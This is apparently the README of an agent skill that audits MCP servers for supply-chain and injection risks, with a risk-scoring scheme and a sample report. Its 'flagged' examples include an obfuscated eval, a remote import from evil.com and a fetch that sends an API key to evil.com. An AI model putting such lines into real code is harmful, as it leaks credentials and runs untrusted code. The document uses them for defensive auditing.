# MCP Security Audit 🔒

> Don't blindly trust MCP servers. Audit them first. Bitwarden CLI was compromised via npm — your MCP server could be next.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-green.svg)]()
[![Skill](https://img.shields.io/badge/type-agent--skill-blue.svg)]()

## Why This Matters

MCP (Model Context Protocol) servers give AI agents superpowers — file access, shell execution, API calls, database queries. But every MCP server you add **expands your attack surface**.

**April 2026:** Bitwarden CLI was compromised via a malicious npm package. MCP servers are npm/pip packages too. The same supply chain attacks that hit Bitwarden can hit your agent's MCP servers.

What a compromised MCP server can do:
- 🚨 **Exfiltrate data** to external servers (your code, API keys, environment variables)
- 💀 **Execute arbitrary commands** on your machine
- 🔓 **Access files** beyond intended scope (path traversal)
- ⚡ **Chain vulnerabilities** for privilege escalation

## How It Works

```
New MCP Server
      │
      ▼
┌──────────────┐
│  🌐 Network  │  Unknown domains? Data exfiltration? TLS validation?
└──────┬───────┘
       │ Pass?
       ▼
┌──────────────┐
│  📁 File     │  Path traversal? Sensitive file access? Scope limits?
│  Access      │
└──────┬───────┘
       │ Pass?
       ▼
┌──────────────┐
│  ⚡ Command  │  Shell injection? Unsanitized input? Arbitrary commands?
│  Exec        │
└──────┬───────┘
       │ Pass?
       ▼
┌──────────────┐
│  📦 Deps     │  Known CVEs? Outdated packages? Supply chain risks?
└──────┬───────┘
       │ Pass?
       ▼
┌──────────────┐
│  🔑 Perms    │  Excessive scope? Missing consent? Privilege escalation?
└──────┬───────┘
       │
       ▼
   Risk Score (0-100)
```

## Risk Scoring

| Score | Rating | Action |
|-------|--------|--------|
| **< 40** | ✅ Low risk | Generally safe to use |
| **40-69** | ⚠️ Medium risk | Use with caution, review code |
| **≥ 70** | 🚫 High risk | Do not use without thorough review |

## Quick Start

```bash
# Claude Code
cp SKILL.md .claude/skills/mcp-security-audit/

# OpenClaw
cp SKILL.md ~/.openclaw/workspace/skills/mcp-security-audit/

# Cursor
cp SKILL.md .cursor/rules/mcp-security-audit.mdc
```

Then, before adding any new MCP server:
```bash
# Check for known vulnerabilities
npm audit          # For npm-based MCP servers
pip-audit          # For Python MCP servers

# Review the source
git clone <mcp-server-repo>
grep -r "fetch\|http\|eval\|exec" src/
```

## What Gets Flagged

### 🚫 Immediate Rejection (Critical)

```javascript
// Obfuscated code — what's it hiding?
eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))

// Remote code loading — executes arbitrary code from the internet
import('https://evil.com/malware.js')

// Credential harvesting — sends your secrets to an external server
fetch('https://evil.com?token=' + process.env.API_KEY)

// Unrestricted file access — reads any file on your system
fs.readFileSync(userInput)  // Path traversal vulnerability!
```

### ⚠️ Needs Review (High)

```javascript
// Unbounded command execution
exec(userProvidedCommand)

// Network calls without domain whitelist
fetch(externalUrl)

// File access without scope limits
fs.readFile(filePath)
```

### ✅ Safe Patterns

```javascript
// Scoped file access — can only read from allowed directory
const allowedDir = path.resolve(process.cwd(), 'data');
if (!filePath.startsWith(allowedDir)) throw new Error('Access denied');

// Whitelisted commands — only known-safe commands allowed
const allowedCommands = ['git', 'npm', 'node'];
if (!allowedCommands.includes(cmd)) throw new Error('Command not allowed');

// Explicit user consent — asks before doing anything risky
if (!await askUserConsent('Allow access to X?')) return;
```

## Sample Audit Report

```
╔══════════════════════════════════════════════════╗
║  MCP Security Audit Report                       ║
║  Target: @example/mcp-filesystem                 ║
║  Date: 2026-04-24                                ║
╠══════════════════════════════════════════════════╣
║                                                   ║
║  🌐 Network:     ✅ No external calls            ║
║  📁 File Access: ⚠️  Path traversal possible     ║
║  ⚡ Commands:    ✅ No shell execution            ║
║  📦 Dependencies:✅ No known CVEs                 ║
║  🔑 Permissions: ⚠️  Broad file scope            ║
║                                                   ║
║  Risk Score: 45/100 (Medium)                     ║
║                                                   ║
║  Recommendations:                                 ║
║  1. Add path scope limits (cwd-relative only)    ║
║  2. Request user consent for /etc/ access        ║
║  3. Add --allow-path flag for explicit scope     ║
╚══════════════════════════════════════════════════╝
```

## Use Cases

- **Before adding** any MCP server to your agent
- **CI/CD integration** to catch vulnerable MCPs in your codebase
- **Security review** of third-party agent frameworks
- **Compliance** audits for enterprise AI deployments

## Works With

- [OpenClaw](https://openclaw.ai)
- Claude Code
- Cursor
- Any MCP-compatible agent framework

## Related Skills

| Skill | Purpose |
|-------|---------|
| [Dependency Guard](https://github.com/aptratcn/skill-dependency-guard) | Pre-install npm/pip supply chain scanner |
| [Git Secret Sweep](https://github.com/aptratcn/skill-git-secret-sweep) | Scan repos for leaked secrets |
| [Prompt Guard](https://github.com/aptratcn/prompt-guard) | Block prompt injection attacks |

## License

MIT — Audit before you trust.
